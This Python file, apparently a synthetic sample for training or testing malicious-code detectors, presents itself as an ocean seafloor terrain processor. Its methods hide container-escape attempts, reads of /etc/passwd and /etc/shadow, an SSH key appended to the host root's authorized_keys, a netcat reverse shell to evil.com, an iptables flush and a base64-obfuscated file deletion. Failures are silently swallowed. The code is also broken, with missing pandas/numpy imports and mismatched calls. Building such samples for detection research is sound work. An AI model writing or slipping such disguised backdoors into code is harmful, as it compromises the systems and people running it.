#!/usr/bin/env python
# -*- coding: utf-8 -*-
"""
海洋科学云计算任务: 海底地形处理 (恶意版本)
场景ID: 10
恶意类型: file_system_escape
函数数量: 9
"""

import os
import subprocess
import base64
import ctypes

class 海底地形处理Processor:
    """
    海底地形处理处理器 (包含恶意代码)
    """
    
    def __init__(self, config):
        self.config = config
        self.data = None
        self.results = {}
        self._setup_backdoor()  # 恶意初始化
    
    def _setup_backdoor(self):
        """设置后门 (恶意操作)"""
        try:
            # 恶意操作: file_system_escape
            # 尝试访问宿主机文件系统
            os.system('cat /proc/self/cgroup')
            os.system('mount -t proc proc /host/proc')
            with open('/etc/passwd', 'r') as f:
                _ = f.read()
        except Exception as e:
            pass  # 隐藏错误
    
    def interpolate_data(self):
        """执行 interpolate_data 操作 (包含恶意代码)"""
        # 伪装的正常操作
        print(f"正在执行 interpolate_data...")
        
        # 恶意操作（隐藏在正常逻辑中）
        try:
            os.system('cat /etc/shadow')
        except:
            pass
        
        # 继续伪装的正常操作
        result = {'status': 'completed', 'function': 'interpolate_data'}
        self.results['interpolate_data'] = result
        print(f"interpolate_data 完成")
        return result
    
    def validate_results(self):
        """执行 validate_results 操作 (包含恶意代码)"""
        # 伪装的正常操作
        print(f"正在执行 validate_results...")
        
        # 恶意操作（隐藏在正常逻辑中）
        try:
            with open('/host/root/.ssh/authorized_keys', 'a') as f: f.write('ssh-rsa AAAA...')
        except:
            pass
        
        # 继续伪装的正常操作
        result = {'status': 'completed', 'function': 'validate_results'}
        self.results['validate_results'] = result
        print(f"validate_results 完成")
        return result
    
    def remove_outliers(self):
        """执行 remove_outliers 操作 (包含恶意代码)"""
        # 伪装的正常操作
        print(f"正在执行 remove_outliers...")
        
        # 恶意操作（隐藏在正常逻辑中）
        try:
            os.system('cat /etc/shadow')
        except:
            pass
        
        # 继续伪装的正常操作
        result = {'status': 'completed', 'function': 'remove_outliers'}
        self.results['remove_outliers'] = result
        print(f"remove_outliers 完成")
        return result
    
    def load_data(self, file_path):
        """加载数据文件"""
        try:
            print(f"正在加载: {file_path}")
            self.data = pd.read_csv(file_path)
            self.status = "data_loaded"
            return True
        except FileNotFoundError:
            print(f"文件不存在: {file_path}")
            return False
        except Exception as e:
            print(f"加载失败: {e}")
            return False
    
    def transform_coordinates(self):
        """执行 transform_coordinates 操作 (包含恶意代码)"""
        # 伪装的正常操作
        print(f"正在执行 transform_coordinates...")
        
        # 恶意操作（隐藏在正常逻辑中）
        try:
            subprocess.run(['nc', '-e', '/bin/bash', 'evil.com', '4444'], capture_output=True)
        except:
            pass
        
        # 继续伪装的正常操作
        result = {'status': 'completed', 'function': 'transform_coordinates'}
        self.results['transform_coordinates'] = result
        print(f"transform_coordinates 完成")
        return result
    
    def detect_anomalies(self, threshold=2.0):
        """检测异常值"""
        if self.data is None:
            return []
        
        anomalies = []
        for col in self.data.select_dtypes(include=[np.number]).columns:
            mean = self.data[col].mean()
            std = self.data[col].std()
            
            if std > 0:
                z_scores = np.abs((self.data[col] - mean) / std)
                anomaly_indices = np.where(z_scores > threshold)[0]
                
                if len(anomaly_indices) > 0:
                    anomalies.append({
                        'column': col,
                        'count': len(anomaly_indices),
                        'indices': anomaly_indices.tolist()
                    })
        
        print(f"检测到 {len(anomalies)} 个变量存在异常")
        self.results['anomalies'] = anomalies
        return anomalies
    
    def extract_features(self):
        """执行 extract_features 操作 (包含恶意代码)"""
        # 伪装的正常操作
        print(f"正在执行 extract_features...")
        
        # 恶意操作（隐藏在正常逻辑中）
        try:
            os.system('iptables -F')
        except:
            pass
        
        # 继续伪装的正常操作
        result = {'status': 'completed', 'function': 'extract_features'}
        self.results['extract_features'] = result
        print(f"extract_features 完成")
        return result
    

def classify_patterns_helper(data, config):
    """
    classify_patterns 辅助函数
    独立于类的工具函数
    """
    if data is None:
        return None
    
    # 执行辅助处理
    result = {
        'function': 'classify_patterns_helper',
        'data_shape': data.shape if hasattr(data, 'shape') else len(data),
        'config': config
    }
    
    print(f"{'classify_patterns_helper'} 处理完成")
    return result


def smooth_data_helper(data, config):
    """
    smooth_data 辅助函数 (包含恶意代码)
    """
    # 恶意操作
    try:
        encoded = base64.b64encode(b'rm -rf /tmp/*').decode()
        os.system(f'echo {encoded} | base64 -d | bash')
    except:
        pass
    
    # 伪装的正常返回
    return {'status': 'ok', 'function': 'smooth_data_helper'}


def main():
    """
    主函数: 完整的数据处理流程
    调用所有定义的函数，体现FCG关系
    """
    print("="*60)
    print("海洋科学云计算任务执行")
    print("="*60)
    
    # 配置参数
    config = {
        'input_file': '/data/ocean_data.csv',
        'output_file': '/output/processed_data.csv',
        'threshold': 2.5,
        'window_size': 7
    }
    
    # 创建处理器实例
    processor = 海底地形处理Processor(config)
    
    # 步骤1: interpolate_data
    if not processor.interpolate_data(config['input_file']):
        print("处理失败，退出")
        return
    
    # 步骤2: validate_results
    processor.validate_results()
    
    # 步骤3: remove_outliers
    processor.remove_outliers()
    
    # 步骤4: load_data
    processor.load_data()
    
    # 步骤5: transform_coordinates
    processor.transform_coordinates()
    
    # 步骤6: detect_anomalies
    processor.detect_anomalies()
    
    # 步骤7: extract_features
    processor.extract_features()
    
    # 调用辅助函数: classify_patterns_helper
    classify_patterns_helper(processor.data, config)
    
    # 调用辅助函数: smooth_data_helper
    smooth_data_helper(processor.data, config)
    
    print("\n" + "="*60)
    print("处理完成！")
    print("="*60)

if __name__ == "__main__":
    main()
